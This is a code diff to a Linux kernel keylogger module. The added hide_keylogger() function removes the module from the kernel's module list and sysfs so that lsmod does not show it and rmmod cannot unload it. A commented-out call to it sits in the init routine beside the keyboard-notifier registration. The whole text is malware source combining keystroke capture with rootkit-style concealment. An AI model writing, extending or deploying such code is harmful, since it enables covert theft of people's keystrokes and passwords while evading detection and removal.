@@ -196,15 +196,29 @@ void store_time_in_buffer(struct timespec * current_time){
 }
 
 
+
+/*This function will hide keylogger from the lsmod command
+Once hidden module cannot be removed with rmmod command
+*/
+static void hide_keylogger(void)
+{
+  list_del_init(&__this_module.list);
+  kobject_del(&THIS_MODULE->mkobj.kobj);
+}
+
 static int init_keylogger(void)
 {
 	/*Used for registering the callback function to the keyboard handler*/
 	register_keyboard_notifier(&keylogger_blk);
+
 	// Initialize timer
 	our_current_time = vmalloc(sizeof(struct timespec));
 	getnstimeofday(our_current_time);
 	store_time_in_buffer(our_current_time);
 	printk(KERN_INFO "[TIME-LOG (time_t): %s]\n",(key_buf.time_string));
+
+	//Uncomment to hide keylogger, but dont do it on development
+	//hide_keylogger() 
 
 	return create_keylogger_file();
 }
